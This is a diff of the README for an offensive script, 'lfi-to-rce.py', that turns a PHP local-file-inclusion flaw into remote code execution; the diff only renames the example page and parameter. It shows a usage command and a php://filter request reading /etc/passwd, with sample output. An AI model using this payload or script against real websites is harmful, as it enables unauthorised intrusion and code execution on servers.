@@ -3,7 +3,7 @@ Found an LFI with PHP filters ? Use this script for RCE !
 
 ## Basic usage
 ```
-python3 lfi-to-rce.py http://example.com/index.php page
+python3 lfi-to-rce.py http://example.com/vuln_page.php file
 ```
 
 ## Detailled commands
@@ -27,10 +27,10 @@ optional arguments:
 ## Explanation
 For this script to work, you have to find an exploitable website with an LFI working with PHP filters.
 
-For example, let's say that http://example.com is vulnerable to LFI on the `index.php` page with the `page` parameter and PHP filters :
+For example, let's say that http://example.com is vulnerable to LFI on the `vuln_page.php` page with the `file` parameter and PHP filters :
 
 ```
-GET http://example.com/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd
+GET http://example.com/vuln_page.php?file=php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -39,7 +39,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
 Then, you can use this script to gain an easy RCE (no need to check for logging files or other bullsh*t :p) :
 
-`python3 lfi-to-rce.py http://example.com/index.php page`
+`python3 lfi-to-rce.py http://example.com/vuln_page.php file`
 
 For this you'll only need a known file on the system which is readable by the user the server is running as. By default, it uses /etc/passwd but if this file is not accessible, you have to change it with the `-f` or `--file` argument. This will be the case if the server is running on Windows for example !
 
